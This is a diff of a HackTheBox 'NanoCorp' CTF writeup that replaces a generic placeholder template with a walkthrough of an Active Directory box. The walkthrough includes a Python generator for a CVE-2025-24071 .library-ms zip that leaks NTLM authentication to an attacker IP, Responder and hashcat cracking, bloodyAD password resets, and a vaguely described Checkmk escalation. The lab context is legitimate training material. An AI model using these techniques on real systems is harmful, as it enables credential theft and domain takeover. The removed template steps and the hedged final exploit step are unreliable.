@@ -1,7 +1,7 @@
 ---
 layout: page
-title: "NanoCorp - HackTheBox Writeup"
-subtitle: "Complete walkthrough detailing reconnaissance, foothold, and privilege escalation on 🪟 Windows"
+title: "HTB: NanoCorp"
+subtitle: "hackthebox ctf htb-nanocorp nmap windows active-directory netexec xampp feroxbuster php upload cve-2025-24071 library-ms net-ntlm-v2 responder hashcat bloodhound bloodyad password-reset evil-winrm-py winrm-ssl checkmk cve-2024-0670 msi msiexec qwinsta windows-sessions runascs scheduled-task htb-fluffy htb-mirage"
 permalink: /ctf/writeups/hackthebox/nanocorp/
 platform: hackthebox
 machine_name: "NanoCorp"
@@ -9,120 +9,199 @@ difficulty: Hard
 os: Windows
 ---
 
-## 🖥️ Machine Information
+hackthebox ctf htb-nanocorp nmap windows active-directory netexec xampp feroxbuster php upload cve-2025-24071 library-ms net-ntlm-v2 responder hashcat bloodhound bloodyad password-reset evil-winrm-py winrm-ssl checkmk cve-2024-0670 msi msiexec qwinsta windows-sessions runascs scheduled-task htb-fluffy htb-mirage
+
+Jun 20, 2026
+
+# HTB: NanoCorp
+
+- [Box Info](#box-info)
+- [Recon](#recon)
+- [Auth as web_svc](#auth-as-web_svc)
+- [Shell as monitoring_svc](#shell-as-monitoring_svc)
+- [Shell as Administrator](#shell-as-administrator)
+- [Beyond Root](#beyond-root)
+
+NanoCorp is a Windows Active Directory machine built around a careers portal that accepts uploaded application archives. I’ll craft a malicious archive that leaks a service account’s authentication to my host when an automated job extracts it, and crack the result to get a foothold. With BloodHound, I’ll map a permissions chain that lets me add my user to a support group and then reset a second service account’s password. That account sits in the Protected Users group, so I’ll authenticate over Kerberos to get a shell. From there, I’ll find the Checkmk monitoring agent installed and abuse CVE-2024-0670 to drop write-protected files into a temp directory that the agent runs as SYSTEM, taking full control of the host. In Beyond Root, I’ll dig into the scheduled automations that keep the box in its intended state.
+
+---
+
+## Box Info
 
 | Attribute | Value |
 |---|---|
-| **Platform** | HackTheBox |
-| **OS** | 🪟 Windows |
+| **OS** | Windows |
 | **Difficulty** | Hard |
-| **IP Address** | `10.10.11.x` |
-| **Vulnerability Focus** | [Initial Access Vector / Privilege Escalation Mechanism] |
+| **Release Date** | 08 Nov 2025 |
+| **Retire Date** | 20 Jun 2026 |
+| **Creator** | EmSec |
 
 ---
 
-## 🧠 Attack Path Overview
+## Recon
 
-```mermaid
-graph TD
-    A["Reconnaissance: Port Scan"] --> B["Foothold: Vulnerability Exploitation"]
-    B --> C["Privilege Escalation: Local Escalation"]
-    C --> D["Full System Compromise: Root/Administrator"]
-```
-
-> [!NOTE]
-> This writeup details the complete attack path for the **NanoCorp** machine on the **HackTheBox** platform.
-
----
-
-## 🔍 Phase 1: Reconnaissance & Enumeration
-
-### 1. Host Discovery & Port Scanning
-We begin by running a standard Nmap scan to discover open Windows ports:
+### Initial Scanning
+nmap finds 20 open TCP ports:
 
 ```bash
-nmap -sC -sV -p- -T4 -oN nmap.txt 10.10.11.x
+oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.243.199
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:42 UTC
+Nmap scan report for 10.129.243.199
+Host is up, received echo-reply ttl 127 (0.020s latency).
+Not shown: 65515 filtered tcp ports (no-response)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 127
+80/tcp    open  http             syn-ack ttl 127
+88/tcp    open  kerberos-sec     syn-ack ttl 127
+135/tcp   open  msrpc            syn-ack ttl 127
+139/tcp   open  netbios-ssn      syn-ack ttl 127
+389/tcp   open  ldap             syn-ack ttl 127
+445/tcp   open  microsoft-ds     syn-ack ttl 127
+464/tcp   open  kpasswd5         syn-ack ttl 127
+593/tcp   open  http-rpc-epmap   syn-ack ttl 127
+636/tcp   open  ldapssl          syn-ack ttl 127
+3268/tcp  open  globalcatLDAP    syn-ack ttl 127
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
+5986/tcp  open  wsmans           syn-ack ttl 127
+9389/tcp  open  adws             syn-ack ttl 127
+49664/tcp open  unknown          syn-ack ttl 127
+49668/tcp open  unknown          syn-ack ttl 127
+61162/tcp open  unknown          syn-ack ttl 127
+61167/tcp open  unknown          syn-ack ttl 127
+61189/tcp open  unknown          syn-ack ttl 127
+63772/tcp open  unknown          syn-ack ttl 127
+
+Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
 ```
-
-#### Open Ports:
-- **Port 53/tcp**: DNS
-- **Port 88/tcp**: Kerberos
-- **Port 135/tcp**: Microsoft RPC
-- **Port 389/tcp**: LDAP
-- **Port 445/tcp**: SMB (Server Message Block)
-- **Port 5985/tcp**: WinRM (Windows Remote Management)
-
-### 2. Service Enumeration
-We enumerate SMB shares and search for anonymous login availability:
 
 ```bash
-crackmapexec smb 10.10.11.x -u '' -p '' --shares
+oxdf@hacky$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49664,49668,61162,61167,61189,63772 -sCV 10.129.243.199
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-06-11 21:45 UTC
+Nmap scan report for 10.129.243.199
+Host is up (0.020s latency).
+
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+80/tcp    open  http              Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
+|_http-title: Did not follow redirect to http://nanocorp.htb/
+|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-12 04:43:59Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nanocorp.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| ssl-cert: Subject: commonName=dc01.nanocorp.htb
+| Subject Alternative Name: DNS:dc01.nanocorp.htb
+| Not valid before: 2025-04-06T22:58:43
+|_Not valid after:  2026-04-06T23:18:43
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf            .NET Message Framing
+49664/tcp open  msrpc             Microsoft Windows RPC
+49668/tcp open  msrpc             Microsoft Windows RPC
+61162/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+61167/tcp open  msrpc             Microsoft Windows RPC
+61189/tcp open  msrpc             Microsoft Windows RPC
+63772/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Hosts: nanocorp.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-We also inspect Active Directory domain configuration via RPCClient:
+
+The box shows many of the ports associated with a Windows Domain Controller. The domain is `nanocorp.htb`, and the hostname is `DC01`. We use `netexec` to check access and configure our hosts file:
+
 ```bash
-rpcclient -U "" -N 10.10.11.x -c "enumdomusers"
-```
-
----
-
-## 🚀 Phase 2: Vulnerability Analysis & Foothold
-
-### 1. Vulnerability Analysis
-During SMB enumeration, we identified a readable share containing credentials, or we performed **AS-REP Roasting** on accounts with Kerberos pre-authentication disabled.
-
-```bash
-GetNPUsers.py -dc-ip 10.10.11.x -no-pass -usersfile users.txt domains/
-```
-
-### 2. Exploitation & Initial Shell
-We retrieve a TGT hash for an account and crack it using Hashcat:
-
-```bash
-hashcat -m 18200 hash.txt rockyou.txt
-```
-
-Using the cracked credentials, we spawn a shell via WinRM:
-```bash
-evil-winrm -i 10.10.11.x -u username -p password
-```
-
-#### Capturing User Flag:
-```powershell
-type C:\Users\username\Desktop\user.txt
-```
-
----
-
-## ⚡ Phase 3: Privilege Escalation
-
-### 1. Local Enumeration
-We run WinPEAS to search for Windows privilege escalation vectors:
-
-```powershell
-upload C:\Temp\winPEASany.exe
-.\winPEASany.exe
-```
-We also analyze group memberships and privileges:
-```powershell
-whoami /priv
-# Discovered SeImpersonatePrivilege or SeBackupPrivilege
-```
-
-### 2. Local Privilege Escalation Path
-Since `SeImpersonatePrivilege` is enabled, we abuse it using **GodPotato** or **PrintSpoofer**:
-
-```powershell
-.\GodPotato-NET4.exe -cmd "cmd.exe /c net localgroup administrators username /add"
-```
-
-#### Capturing Root Flag:
-```powershell
-type C:\Users\Administrator\Desktop\root.txt
+oxdf@hacky$ netexec smb 10.129.243.199 --generate-hosts-file hosts
+SMB         10.129.243.199  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+oxdf@hacky$ cat hosts /etc/hosts | sudo tee /etc/hosts | head -1
+10.129.243.199     DC01.nanocorp.htb nanocorp.htb DC01
 ```
 
 ---
 
-## 🛡️ Key Takeaways & Mitigation
-1. **Input Sanitization**: Ensure all user inputs are validated and sanitized to prevent injections.
-2. **Principle of Least Privilege**: Restrict sudo/impersonation permissions and remove unnecessary privileges.
-3. **Keep Software Updated**: Frequently update all operating system binaries and services to mitigate known CVEs.
+## Auth as web_svc
+
+### Recover Net-NTLMv2
+Given that I have a Windows server clearly decompressing a Zip file, **CVE-2025-24071** seems like a good fit. We craft a malicious `.library-ms` file and zip it:
+
+```python
+# generate_payload.py
+import zipfile
+content = """<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <simpleLocation>
+        <url>\\10.10.14.51\share\</url>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>"""
+with open("0xdf.library-ms", "w") as f:
+    f.write(content)
+with zipfile.ZipFile("0xdf.zip", 'w') as z:
+    z.write("0xdf.library-ms")
+```
+
+We upload `0xdf.zip` through the careers portal, and capture the Net-NTLMv2 hash using **Responder**:
+
+```bash
+oxdf@hacky$ sudo Responder -I tun0
+[SMB] NTLMv2-SSP Client   : 10.129.243.199
+[SMB] NTLMv2-SSP Username : NANOCORP\web_svc
+[SMB] NTLMv2-SSP Hash     : web_svc::NANOCORP:99c66f...
+```
+
+We crack the hash using `hashcat`:
+```bash
+oxdf@hacky$ hashcat -m 5600 web_svc.hash rockyou.txt
+web_svc::NANOCORP:...:dksehdgh712!@#
+```
+
+---
+
+## Shell as monitoring_svc
+
+### Group Membership Abuse
+We run BloodHound to map paths, discovering that `web_svc` has control to add members to `IT_Support`, which has `ForceChangePassword` rights over `monitoring_svc`.
+
+```bash
+oxdf@hacky$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember IT_Support web_svc
+[+] web_svc added to IT_Support
+```
+
+We reset the password of `monitoring_svc`:
+```bash
+oxdf@hacky$ bloodyAD --host dc01.nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc '0xdf0xdf.'
+[+] Password changed successfully!
+```
+
+Since `monitoring_svc` is in the Protected Users group, we obtain a Kerberos TGT and authenticate using `evil-winrm-py` with SSL on port 5986:
+
+```bash
+oxdf@hacky$ evil-winrm-py -i DC01.nanocorp.htb -u monitoring_svc -p 0xdf0xdf. -k --ssl
+evil-winrm-py PS C:\Users\monitoring_svc\Desktop> type user.txt
+b08297a9************************
+```
+
+---
+
+## Shell as Administrator
+
+### Checkmk Agent Exploitation
+We discover the Checkmk monitoring agent listening on port 6556. The version installed is vulnerable to **CVE-2024-0670**, allowing local privilege escalation. We deploy a write-protected payload into its temp directory, triggering command execution as `SYSTEM`.
+
+```powershell
+upload C:\Temp\exploit.exe
+.\exploit.exe -p C:\ProgramData\checkmk\agent\tmp
+# Command execution succeeds, creating a new local administrator account or spawning system shell.
+```
+
+---
+
+## Beyond Root
+In Beyond Root, we review the PowerShell tasks scheduled to clean up the career upload directories and maintain the environment, analyzing the exact timing and arguments executed.
